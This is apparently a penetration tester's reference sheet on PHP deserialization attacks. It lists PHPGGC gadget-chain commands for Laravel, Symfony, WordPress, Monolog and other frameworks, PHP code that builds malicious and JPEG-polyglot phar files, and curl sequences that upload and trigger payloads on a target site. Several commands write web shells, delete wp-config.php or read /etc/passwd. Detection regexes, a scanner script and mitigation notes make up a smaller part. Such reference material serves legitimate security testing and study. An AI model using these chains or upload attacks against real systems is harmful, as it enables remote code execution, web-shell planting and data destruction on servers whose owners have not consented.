# PHP Deserialization Attack Chains Reference

## Overview

PHP deserialization vulnerabilities arise from `unserialize()` processing untrusted data
and from `phar://` stream wrapper triggering metadata deserialization. Exploitation leverages
"POP chains" — Property-Oriented Programming chains that abuse magic methods (`__destruct`,
`__wakeup`, `__toString`, `__call`, etc.) present in application or framework code.

PHPGGC (PHP Generic Gadget Chains) is the standard tool for generating payloads.

---

## 1. Entry Points

### 1.1 unserialize()

**Direct sinks:**
```php
unserialize($user_input);
unserialize($_GET['data']);
unserialize($_POST['data']);
unserialize($_COOKIE['session']);
unserialize(base64_decode($input));
unserialize(gzuncompress($input));
```

**Framework / CMS sinks:**
```php
// WordPress
maybe_unserialize($data);

// Laravel (older versions)
Illuminate\Cookie\CookieJar  // encrypted + serialized cookies

// Magento
Mage::helper('core')->jsonDecode($data);  // some paths lead to unserialize
```

**Detection regex:**
```regex
unserialize\s*\(
maybe_unserialize\s*\(
```

### 1.2 phar:// Stream Wrapper

**Any file operation function can trigger phar deserialization:**
```php
file_exists('phar://user_upload.jpg');
file_get_contents('phar://...');
include('phar://...');
fopen('phar://...', 'r');
is_file('phar://...');
is_dir('phar://...');
is_readable('phar://...');
stat('phar://...');
filesize('phar://...');
filetype('phar://...');
copy('phar://...', '/tmp/x');
rename('phar://...', '/tmp/x');
unlink('phar://...');
mkdir('phar://...');
rmdir('phar://...');

// Image functions
getimagesize('phar://...');
imagecreatefromjpeg('phar://...');
imagecreatefrompng('phar://...');
exif_read_data('phar://...');

// Iterator functions
new DirectoryIterator('phar://...');
new RecursiveDirectoryIterator('phar://...');
```

**Detection — path controllable + file function:**
```regex
(file_exists|file_get_contents|fopen|include|require|is_file|is_dir|stat|filesize|getimagesize|imagecreatefrom\w+|exif_read_data|DirectoryIterator|glob)\s*\(\s*\$
```

---

## 2. PHPGGC Chains by Framework

### 2.1 Laravel

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Laravel/RCE1 | RCE | 5.4.27 | `phpggc Laravel/RCE1 system id` |
| Laravel/RCE2 | RCE | 5.4.0–5.4.* | `phpggc Laravel/RCE2 system id` |
| Laravel/RCE3 | RCE | 5.5.0–5.5.39 | `phpggc Laravel/RCE3 system id` |
| Laravel/RCE4 | RCE | 5.5.0–5.8.35 | `phpggc Laravel/RCE4 system id` |
| Laravel/RCE5 | RCE | 5.8.30 | `phpggc Laravel/RCE5 "system('id');"` |
| Laravel/RCE6 | RCE | 5.5.0–5.8.35 | `phpggc Laravel/RCE6 system id` |
| Laravel/RCE7 | RCE | 5.4.0–8.x | `phpggc Laravel/RCE7 system id` |
| Laravel/RCE8 | RCE | 7.0–8.x | `phpggc Laravel/RCE8 system id` |
| Laravel/RCE9 | RCE | 5.4.0–9.x | `phpggc Laravel/RCE9 system id` |
| Laravel/RCE10 | RCE | 5.6.0–9.x | `phpggc Laravel/RCE10 system id` |
| Laravel/RCE11 | RCE | 5.4.0–9.x | `phpggc Laravel/RCE11 system id` |
| Laravel/RCE12 | RCE | 5.8.35–10.x | `phpggc Laravel/RCE12 system id` |
| Laravel/RCE13 | RCE | 5.4.0–10.x | `phpggc Laravel/RCE13 system id` |
| Laravel/RCE14 | RCE | 5.4.0–10.x | `phpggc Laravel/RCE14 system id` |
| Laravel/RCE15 | RCE | 5.4.0–10.x | `phpggc Laravel/RCE15 system id` |
| Laravel/RCE16 | RCE | 5.5.0–10.x | `phpggc Laravel/RCE16 system id` |

**Magic method chain example (Laravel/RCE1):**
```
PendingBroadcast.__destruct()
  → Dispatcher.dispatch()
    → call_user_func($this->queueResolver, $command)
      → system('id')
```

### 2.2 Symfony

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Symfony/RCE1 | RCE | 3.3 | `phpggc Symfony/RCE1 system id` |
| Symfony/RCE2 | RCE | 2.3.42, 2.6, 3.x | `phpggc Symfony/RCE2 system id` |
| Symfony/RCE3 | RCE | 2.6, 3.x | `phpggc Symfony/RCE3 system id` |
| Symfony/RCE4 | RCE | 3.4 | `phpggc Symfony/RCE4 system id` |
| Symfony/RCE5 | RCE | 5.x | `phpggc Symfony/RCE5 id` |
| Symfony/RCE6 | RCE | 5.x | `phpggc Symfony/RCE6 id` |
| Symfony/RCE7 | RCE | 2.x–6.x | `phpggc Symfony/RCE7 system id` |
| Symfony/FW1 | File Write | 2.5.2 | `phpggc Symfony/FW1 /tmp/shell.php '<?php system($_GET["cmd"]); ?>'` |
| Symfony/FW2 | File Write | 5.x | `phpggc Symfony/FW2 /tmp/shell.php /path/to/local/file` |
| Symfony/FD1 | File Delete | 2.x–6.x | `phpggc Symfony/FD1 /var/www/html/.htaccess` |

**Secret-based exploitation (`_fragment` route, CVE-2019-18889):**
```bash
# If APP_SECRET is known
python3 symfony_rce.py --url "https://target.com/_fragment" \
  --secret "ThisTokenIsNotSoSecretChangeIt" \
  --cmd "id"
```

### 2.3 WordPress

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| WordPress/RCE1 | RCE | 4.0–5.x | `phpggc WordPress/RCE1 system id` |
| WordPress/RCE2 | RCE | 4.0–5.x | `phpggc WordPress/RCE2 system id` |
| WordPress/PHPInfo1 | PHPInfo | 4.x–5.x | `phpggc WordPress/PHPInfo1` |
| WordPress/FD1 | File Delete | 4.x–5.x | `phpggc WordPress/FD1 /var/www/html/wp-config.php` |

**Common plugin unserialize sinks:**
```php
// WooCommerce, JERF, custom plugins
$data = maybe_unserialize(get_option('custom_plugin_data'));
$obj  = unserialize($row->meta_value);
```

### 2.4 Yii

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Yii/RCE1 | RCE | 1.1.20 | `phpggc Yii/RCE1 system id` |
| Yii/RCE2 | RCE | 1.1.19 | `phpggc Yii/RCE2 id` |

**Magic method chain (Yii/RCE1):**
```
BatchQueryResult.__destruct()
  → close()
    → $this->_dataReader->close()
      → __call() on crafted object
        → call_user_func(system, 'id')
```

### 2.5 ThinkPHP

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| ThinkPHP/RCE1 | RCE | 5.1.x | `phpggc ThinkPHP/RCE1 system id` |
| ThinkPHP/RCE2 | RCE | 5.0.x | `phpggc ThinkPHP/RCE2 system id` |
| ThinkPHP/FW1 | File Write | 5.0.x | `phpggc ThinkPHP/FW1 /tmp/x.php '<?php phpinfo(); ?>'` |

### 2.6 Guzzle

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Guzzle/RCE1 | RCE | 6.0.0–6.3.3+ | `phpggc Guzzle/RCE1 system id` |
| Guzzle/FW1 | File Write | 6.0–6.3.3+ | `phpggc Guzzle/FW1 /tmp/shell.php '<?php system($_GET["c"]); ?>'` |
| Guzzle/INFO1 | PHPInfo | 6.0–7.x | `phpggc Guzzle/INFO1` |

### 2.7 Monolog

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Monolog/RCE1 | RCE | 1.4.1–1.6.0 | `phpggc Monolog/RCE1 system id` |
| Monolog/RCE2 | RCE | 1.4.1 | `phpggc Monolog/RCE2 system id` |
| Monolog/RCE3 | RCE | 1.1.0 | `phpggc Monolog/RCE3 system id` |
| Monolog/RCE4 | RCE | 1.6.0–1.25.x | `phpggc Monolog/RCE4 system id` |
| Monolog/RCE5 | RCE | 1.25–2.x | `phpggc Monolog/RCE5 system id` |
| Monolog/RCE6 | RCE | 1.x–2.x | `phpggc Monolog/RCE6 system id` |
| Monolog/RCE7 | RCE | 1.x–3.x | `phpggc Monolog/RCE7 system id` |
| Monolog/FW1 | File Write | 1.x–3.x | `phpggc Monolog/FW1 /tmp/x.php '<?php system($_GET["c"]); ?>'` |

### 2.8 Doctrine

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| Doctrine/RCE1 | RCE | 1.x–2.x | `phpggc Doctrine/RCE1 system id` |
| Doctrine/RCE2 | RCE | 2.x | `phpggc Doctrine/RCE2 system id` |
| Doctrine/FW1 | File Write | 2.x | `phpggc Doctrine/FW1 /tmp/x.php '<?php phpinfo(); ?>'` |
| Doctrine/FW2 | File Write | 2.x | `phpggc Doctrine/FW2 /tmp/x.php /path/to/local` |

### 2.9 SwiftMailer

| Chain | Type | Versions | PHPGGC Command |
|-------|------|----------|----------------|
| SwiftMailer/FW1 | File Write | 5.1.0–6.x | `phpggc SwiftMailer/FW1 /var/www/html/shell.php '<?php system($_GET["c"]); ?>'` |
| SwiftMailer/FW2 | File Write | 5.x–6.x | `phpggc SwiftMailer/FW2 /var/www/html/shell.php /path/to/local` |
| SwiftMailer/FW3 | File Write | 6.x | `phpggc SwiftMailer/FW3 /tmp/shell.php '<?=system($_GET[0]);'` |
| SwiftMailer/FW4 | File Write | 5.x–6.x | `phpggc SwiftMailer/FW4 /tmp/shell.php '<?php system($_GET["c"]); ?>'` |
| SwiftMailer/FR1 | File Read | 5.x–6.x | `phpggc SwiftMailer/FR1 /etc/passwd` |

---

## 3. Phar Deserialization

### 3.1 Creating a Malicious Phar

```php
<?php
// Generate malicious.phar with embedded serialized object
// Requires phar.readonly=0 in php.ini

class EvilClass {
    public $cmd = 'id';
    public function __destruct() {
        system($this->cmd);
    }
}

$phar = new Phar('malicious.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$obj = new EvilClass();
$obj->cmd = 'id > /tmp/proof.txt';
$phar->setMetadata($obj);

$phar->stopBuffering();
echo "[+] malicious.phar created\n";
```

### 3.2 Using PHPGGC to Generate Phar

```bash
# Generate phar with Laravel/RCE1 chain
phpggc -p phar -o /tmp/exploit.phar Laravel/RCE1 system id

# Generate as JPEG polyglot
phpggc -p phar -pj /tmp/legit.jpg -o /tmp/exploit.jpg Laravel/RCE1 system id

# Generate as PNG polyglot
phpggc -p phar -pp /tmp/legit.png -o /tmp/exploit.png Monolog/RCE5 system id

# With base64 output
phpggc -p phar -b Laravel/RCE1 system id

# With URL-encoded output
phpggc -p phar -u Laravel/RCE1 system id

# Fast-destruct (triggers __destruct during deserialization, not GC)
phpggc -p phar --fast-destruct Laravel/RCE1 system id
```

### 3.3 Phar Polyglot Bypass (JPEG)

```php
<?php
$jpeg_header = file_get_contents('legit.jpg');

$phar = new Phar('polyglot.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');

$stub = $jpeg_header . ' __HALT_COMPILER(); ?>';
$phar->setStub($stub);

$obj = new TargetClass();
$phar->setMetadata($obj);
$phar->stopBuffering();

rename('polyglot.phar', 'polyglot.jpg');
```

### 3.4 Trigger Functions for Phar

Once a `.phar` (or disguised file) is uploaded, trigger with:
```php
// If you control the path argument to any of these:
file_exists('phar:///uploads/avatar.jpg/test.txt');
getimagesize('phar:///uploads/avatar.jpg');
file_get_contents('phar:///uploads/avatar.jpg/test.txt');
new DirectoryIterator('phar:///uploads/avatar.jpg');
```

### 3.5 Bypassing Phar Restrictions

**Extension bypass:**
```
phar:///uploads/evil.gif          # renamed phar
phar:///uploads/evil.jpg          # polyglot
phar:///uploads/evil.pdf          # polyglot
```

**Wrapper variants:**
```
phar:///path/to/file
compress.zlib://phar:///path/to/file
compress.bzip2://phar:///path/to/file
php://filter/resource=phar:///path/to/file
php://filter/read=convert.base64-encode/resource=phar:///path/to/file
```

**Path normalization bypass:**
```
phar:///uploads/../uploads/evil.jpg
phar:///uploads/./evil.jpg
```

---

## 4. Detection in Code

### 4.1 Static Analysis Patterns

```regex
# Direct unserialize
unserialize\s*\(\s*\$_(GET|POST|REQUEST|COOKIE|SERVER)
unserialize\s*\(\s*base64_decode\s*\(
unserialize\s*\(\s*\$\w+     # variable input

# Phar wrapper (path from user input)
(file_exists|file_get_contents|fopen|include|require|is_file|stat|getimagesize)\s*\(\s*\$

# WordPress
maybe_unserialize\s*\(

# Magic methods (gadget candidates)
function\s+__(destruct|wakeup|toString|call|callStatic|get|set|isset|unset)\s*\(

# Dangerous sinks reachable from magic methods
call_user_func\s*\(
call_user_func_array\s*\(
array_map\s*\(.*\$this->
eval\s*\(
assert\s*\(
system\s*\(
exec\s*\(
passthru\s*\(
shell_exec\s*\(
proc_open\s*\(
popen\s*\(
file_put_contents\s*\(.*\$this->
```

### 4.2 Automated Scanner Script

```php
<?php
/**
 * Scan PHP source files for deserialization sinks and gadget candidates.
 * Usage: php scan_deser.php /path/to/project
 */

$sinks = [
    'unserialize'        => '/unserialize\s*\(/i',
    'maybe_unserialize'  => '/maybe_unserialize\s*\(/i',
    'phar_wrapper'       => '/[\'"]phar:\/\//i',
    '__destruct'         => '/function\s+__destruct\s*\(/i',
    '__wakeup'           => '/function\s+__wakeup\s*\(/i',
    '__toString'         => '/function\s+__toString\s*\(/i',
    'call_user_func'     => '/call_user_func(_array)?\s*\(/i',
];

$dir = $argv[1] ?? '.';
$rii = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($dir)
);

$findings = [];
foreach ($rii as $file) {
    if ($file->getExtension() !== 'php') continue;
    $content = file_get_contents($file->getPathname());
    $lines = explode("\n", $content);
    foreach ($sinks as $name => $pattern) {
        foreach ($lines as $num => $line) {
            if (preg_match($pattern, $line)) {
                $findings[] = sprintf(
                    "[%s] %s:%d → %s",
                    $name,
                    $file->getPathname(),
                    $num + 1,
                    trim($line)
                );
            }
        }
    }
}

foreach ($findings as $f) echo $f . "\n";
printf("\n[*] Total findings: %d\n", count($findings));
```

---

## 5. Common Exploitation Scenarios

### 5.1 Laravel Cookie Deserialization

```bash
# 1. Obtain APP_KEY (from .env leak, debug page, git exposure)
APP_KEY="base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0="

# 2. Generate serialized payload
phpggc Laravel/RCE1 system 'id > /tmp/proof.txt' -b

# 3. Encrypt payload with APP_KEY and send as cookie
# Use laravel-poc-CVE-2018-15133.py or craft manually
python3 laravel_exploit.py --key "$APP_KEY" \
  --payload "$(phpggc Laravel/RCE1 system id -b)" \
  --url "https://target.com/"
```

### 5.2 Symfony _fragment RCE (CVE-2019-18889)

```bash
# Requires knowledge of APP_SECRET
# Default: ThisTokenIsNotSoSecretChangeIt

phpggc Symfony/RCE4 system id -b
# Then sign the HMAC with APP_SECRET and send to /_fragment
```

### 5.3 WordPress Plugin Deserialization

```bash
# If a plugin stores serialized data in user-accessible options/meta
phpggc WordPress/RCE1 system id

# Send via vulnerable parameter
curl -X POST "https://target.com/wp-admin/admin-ajax.php" \
  -d "action=vulnerable_action&data=$(phpggc WordPress/RCE1 system id -s)"
```

### 5.4 Phar + File Upload Chain

```bash
# 1. Generate phar polyglot JPEG
phpggc -p phar -pj legit.jpg -o exploit.jpg Monolog/RCE5 system id

# 2. Upload as avatar/image through application
curl -X POST "https://target.com/upload" \
  -F "avatar=@exploit.jpg;type=image/jpeg"

# 3. Trigger phar deserialization via file operation
curl "https://target.com/check-image?path=phar:///uploads/exploit.jpg/test.txt"
```

---

## 6. PHPGGC Quick Reference

```bash
# List all available chains
phpggc -l

# List chains for a specific framework
phpggc -l Laravel
phpggc -l Symfony
phpggc -l Monolog

# Output formats
phpggc <chain> <args>              # raw serialized
phpggc <chain> <args> -b           # base64
phpggc <chain> <args> -u           # URL-encoded
phpggc <chain> <args> -s           # soft URL-encode
phpggc <chain> <args> -j           # JSON

# Phar generation
phpggc -p phar -o out.phar <chain> <args>
phpggc -p phar -pj img.jpg -o out.jpg <chain> <args>     # JPEG polyglot
phpggc -p phar -pp img.png -o out.png <chain> <args>     # PNG polyglot

# Wrappers / encoding
phpggc -w <chain> <args>           # with fast-destruct wrapper
phpggc --fast-destruct <chain> <args>
phpggc -a <chain> <args>           # ASCII-only strings

# Info about a specific chain
phpggc -i Laravel/RCE1
```

---

## 7. Mitigation Notes (for report context)

- **Never pass untrusted data to `unserialize()`** — use `json_decode()` instead.
- If `unserialize()` is unavoidable, use the `allowed_classes` parameter (PHP 7.0+):
  ```php
  unserialize($data, ['allowed_classes' => false]);
  unserialize($data, ['allowed_classes' => ['SafeClass']]);
  ```
- Set `phar.readonly = 1` and disable `phar://` wrapper if not needed.
- In PHP 8.0+, `phar://` deserialization is restricted but not eliminated.
- Review all `__destruct`, `__wakeup`, `__toString` methods as potential gadget candidates.
- Use signed/encrypted serialization (Laravel's encryption is sufficient if `APP_KEY` is secret).
- Framework updates often break old gadget chains but introduce new ones — keep dependencies current.
